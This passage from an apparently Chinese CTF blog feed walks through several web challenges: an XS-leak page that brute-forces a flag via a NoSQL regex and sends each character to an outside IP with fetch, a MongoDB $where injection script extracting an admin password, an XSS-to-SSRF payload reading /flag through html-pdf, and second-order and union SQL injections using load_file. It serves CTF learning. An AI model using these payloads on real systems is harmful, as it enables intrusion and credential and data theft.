class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xssbotexp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">        vps = <span class="hljs-string">&#x27;http://39.107.239.30:80&#x27;</span></span><br><span class="javascript">        chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-+&#x27;</span></span><br><br><span class="javascript">        <span class="hljs-keyword">const</span> search = <span class="hljs-keyword">async</span> (url) =&gt;&#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="javascript">                <span class="hljs-keyword">const</span> object = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;object&quot;</span>);</span><br>                object.data = url;<br>                object.onload = resolve;<br>                object.onerror = reject;<br><span class="javascript">                <span class="hljs-built_in">document</span>.head.appendChild(object);</span><br>            &#125;);<br>        &#125;<br><br><span class="javascript">        <span class="hljs-keyword">const</span> exp = <span class="hljs-keyword">async</span> (url) =&gt;&#123;</span><br><span class="javascript">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="javascript">              <span class="hljs-keyword">await</span> search(url)</span><br><span class="javascript">              <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="javascript">            &#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br>            &#125;<br>        &#125;<br><span class="javascript">        (<span class="hljs-keyword">async</span> () =&gt; &#123;</span><br><span class="javascript">            <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="javascript">            <span class="hljs-keyword">let</span> url = <span class="hljs-string">`http://6d7f5839-9b17-40fe-b5de-b04cfdae1037.node4.buuoj.cn:81/packages/list?search[description][$regex]=^<span class="hljs-subst">$&#123;flag&#125;</span>`</span></span><br><span class="javascript">            <span class="hljs-keyword">while</span> (flag.charAt(flag.length - <span class="hljs-number">1</span>) !== <span class="hljs-string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> i <span class="hljs-keyword">of</span> chars ) &#123;</span><br><span class="javascript">                    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">await</span>(search(url + <span class="hljs-built_in">escape</span>(i))) ) &#123;</span><br><span class="javascript">                        url = url + <span class="hljs-built_in">escape</span>(i)</span><br>                        flag += i<br><span class="javascript">                        <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">`<span class="hljs-subst">$&#123;vps&#125;</span>/?flag=<span class="hljs-subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>&#125;)</span><br><span class="javascript">                        <span class="hljs-keyword">break</span>;</span><br><span class="javascript">                    &#125;   <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">                        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;failed&#x27;</span>);</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;)();<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>先在search界面不断发包竞争</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/packages/list?search[$where]=hex_md5%3dfunction()&#123;return%20%27202cb962ac59075b964b07152d234b70%27&#125;;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1a52a622-4f18-49e5-9060-3394c76b953c.node4.buuoj.cn:81<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=eyJ1Ijp7IiBiIjoiZ0FTVk13QUFBQUFBQUFDTUFtNTBsSXdHYzNsemRHVnRsSk9VakJ0bFkyaHZJQ0ErSUM5MGJYQXZNVEV4bElXVVVwUXUifX0.YJDP-g.QEEJmYHE5PkdYKgl-zKi4lybDYo; session=s%3A60hAjRd2Nlts_fWYx7o_fnfOBx1H2lEs.tibY6R1rxcarL1x%2B8ucVTkXMFIhlryODzOsyi13uoMM<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br></code></pre></div></td></tr></table></figure><p>直到auth提交token通过即可</p><p><img src="https://img-blog.csdnimg.cn/80923db490644fac95f4eff48d60cc44.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>然后提交我们的文章id，在vps上开服务<code>python3 -m http.server 80</code>监听即可。</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>这里其实在auth操作时存在注入，换个思路想，flag在admin用户的文章下，那将admin的密码注入出来不就行了。</p><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></div></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&#x27;http://6d7f5839-9b17-40fe-b5de-b04cfdae1037.node4.buuoj.cn:81/auth&#x27;</span><br>s = requests.session()<br>password = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">130</span>):<br>        cookies = &#123;<span class="hljs-string">&#x27;session&#x27;</span>:<span class="hljs-string">&#x27;s%3A9fJutdIDuXFuT3gcoAor1vkFD9Ikv2Tc.f3ROtzd9M%2Fzu%2BsRjUa60NMseu56cqBbZ5rqQEyk3Ghc&#x27;</span>&#125;<br>        data = &#123;<span class="hljs-string">&#x27;_csrf&#x27;</span>:<span class="hljs-string">&#x27;1zvGp4cd-G4wtUGigLyKgRmKIy-BWtBkFGH0&#x27;</span>,<br>                <span class="hljs-string">&#x27;token&#x27;</span>:<span class="hljs-string">&quot;cf87efe0c36a12aec113cd7982043573\&quot;||(this.username==\&quot;admin\&quot;&amp;&amp;this.password[&#123;&#125;]==\&quot;&#123;&#125;\&quot;)||\&quot;&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(j))&#125;<br>                <span class="hljs-comment"># &#x27;token&#x27;:&#x27;&quot;+hex_md5(this.password)&amp;&amp;this.password[&#123;&#125;]==&quot;&#123;&#125;&quot;&amp;&amp;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;==&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;.format(i,chr(j))&#125;</span><br>        res = s.post(url,data=data,cookies=cookies)<br><br>        <span class="hljs-comment"># print(res.text)</span><br>        <span class="hljs-comment"># print(&#x27;------------------&#x27;)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Found. Redirecting to&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            password +=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---------&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><br></code></pre></div></td></tr></table></figure><p>第二种payload是直接利用js的报错，因为MongoDB支持Javascript语法。所以可以用js语法去抛出内容是admin密码的异常</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">_csrf=2PzwJX5n-Y1qH02TLkz3_JXa_OBn2hpgU2G8&amp;token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-string">&quot;||</span><br><span class="hljs-string">(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin<br>#MongoError: Executor error during find command :: caused by :: Error: !@#&amp;@&amp;@efefef*@((@))grgregret3r : @:1:125 @:1:112<br></code></pre></div></td></tr></table></figure><h1 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h1><p>审计源码，发现一些点</p><p><img src="https://img-blog.csdnimg.cn/f3aed98be9b64148a68d836e79a5fe3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里的<code>content</code>考虑xss，上面存在过滤，但可以用数组绕过，但是下面是通过<code>superuser</code>创建的数据库，无法用<code>/api/files/:id</code>访问</p><p><img src="https://img-blog.csdnimg.cn/0cfee0eda2cd4c7b836a5e5970a5b21c.png" alt="在这里插入图片描述"></p><p>通过查找<code>html-pdf</code>库发现它存在一个任意文件读取：</p><blockquote><p>html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(“GET”,”file:///etc/passwd”) will result in a PDF document with the contents of /etc/passwd.</p></blockquote><p>接着往下看，有一个提示，这里限制了需要本地才能访问，应该是xss打ssrf，然后进行<code>create</code>操作,结合文档可以用xhr操作</p><p><img src="https://img-blog.csdnimg.cn/a4f8ca711a514b5b9cb41e60cdfd6900.png" alt="在这里插入图片描述"></p><p>最后这里明显可以看到存在文件读取。</p><p><img src="https://img-blog.csdnimg.cn/c627162578714046893c6287b5fa1f08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里打ssrf的操作使用xhr来打，需要注意的是这里content的内容一定要url编码，被坑了很久。最后访问<code>/api/files/1234</code>即可</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">content[]=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">xhr.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/xhtml+xml&quot;</span>);</span><br><span class="javascript">xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=/flag&amp;checksum=1234&quot;</span>, <span class="hljs-literal">true</span>);</span><br>    xhr.send();<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="cralwer-z"><a href="#cralwer-z" class="headerlink" title="cralwer_z"></a>cralwer_z</h1><p>在<code>/profile</code>中，更新了<code>personalbucket</code>并且将valid设置成了false。</p><p><img src="https://img-blog.csdnimg.cn/f0589ea4a2834814a83229c106e32c99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>进行了一个匹配，符合则跳转，这里好绕过直接?a=.oss-cn-beijing.ichunqiu.com就行</p><p><img src="https://img-blog.csdnimg.cn/1492f0846ecd4d0390a9ff603cb71246.png" alt="在这里插入图片描述"></p><p>verify中将bucket更新为personalbucket，但是前提是valid要为true。</p><p><img src="https://img-blog.csdnimg.cn/9bd7266f7c354e048d7739db42aa8c7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>最后在bucket中访问了设置的bucket，这里的爬虫使用了zombie库，这个库存在rce漏洞，搜索引擎真的很重要</p><p>参考<a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p><p><img src="https://img-blog.csdnimg.cn/47ff8e3d81bd48438119da3ab0c4785d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>思路很明显了，先在profile中随便传一个抓包获取token，然后将bucket设置成自己的url，然后提交将personalbucket更新，然后拿最开始获取的token访问verify来实现更新，最后访问bucket界面执行命令。这里buu上反弹不了shell不知道为啥。</p><p><img src="https://img-blog.csdnimg.cn/5b52a4587fbc4b67ac9a29ad485c54be.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>做几道网鼎杯</title>
    <link href="/2021/08/18/2021-8-16-%E5%81%9A%E5%87%A0%E9%81%93%E9%A2%98/"/>
    <url>/2021/08/18/2021-8-16-%E5%81%9A%E5%87%A0%E9%81%93%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h1><p>打开界面，跟着提交帖子发现要登陆，登陆界面最开始以为是直接注入呢，后来才注意到有提示<code>***</code>要爆破，爆破出来时666，登陆后正常提交帖子，然后好像就没啥了，想起来扫一下目录，扫到了git文件泄露，直接githack下载下来，git恢复了一下拿到源码。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>比较明显的二次注入，在<code>write</code>操作中将恶意<code>category</code>写入数据库，其实那个转义函数没什么用，因为存入数据库的还是原数据，后来在<code>comment</code>中直接调用了<code>category</code>，造成了二次注入。</p><p>最开始试了正常的读取数据库但是没发现回显，后来读了下user()发现是root权限，那flag应该不在数据库，最后发现可以用<code>load_file</code></p><p>来读bash命令记录。这个地方能读取也是建立在可读权限上的</p><p>先写个帖子使<code>category = 1&#39;,content=(select load_file(&#39;/home/www/.bash_history&#39;)),/*</code>然后留言出<code>*/#</code>闭合就可以，</p><p><img src="https://img-blog.csdnimg.cn/d6ff82be96b8453db7fd742e3f4f5587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>再读<code>.DS_Store</code> ，但需要hex编码一下，因为有不可见字符，接着读<code>flag_8946e1ff1ee3e40f.php</code>拿flag</p><h1 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h1><p>进入页面发现尝试join，按要求输入了，然后创建了一个用户的样子，看了下源代码，发现一个链接<code>view.php?no=1</code>，感觉是注入的样子，点开正常界面，试了下no=2报错了，接着简单测试了下，用<code>union select</code>时返回了<code>no hack ~_~</code>，被ban了！这里应该就可以确定存在注入了，试了下内敛注释可以绕过。测试了下有四个字段<code>no=-1%20union/**/select%201,2,3,4#</code>，发现<code>username</code>处回显了2，接着就可以来得到表字段啥的了。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(database()),3,4%20limit%200,1#     <br>回显fakebook<br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1#              <br>回显users<br><br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20limit%200,1#     <br>回显no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS、<br><br>no&#x3D;-1%20union&#x2F;**&#x2F;select%201,group_concat(no,username,passwd,data),3,4%20from%20users%20limit%200,1#<br>回显1kkfineba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;kkfine&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:25:&quot;https:&#x2F;&#x2F;haoami.github.io&#x2F;&quot;;&#125;<br><br>no:1<br>username:kkfine<br>passwd:ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413<br>data:O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;kkfine&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:25:&quot;https:&#x2F;&#x2F;haoami.github.io&#x2F;&quot;;&#125;<br></code></pre></div></td></tr></table></figure><p>再看到这个序列化数据猜到和反序列化有关，到这卡了一下不知道干啥了，然后想起来目录还没扫，发现有robots.txt中有给出了bak文件，拿到源码分析，</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br><br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span 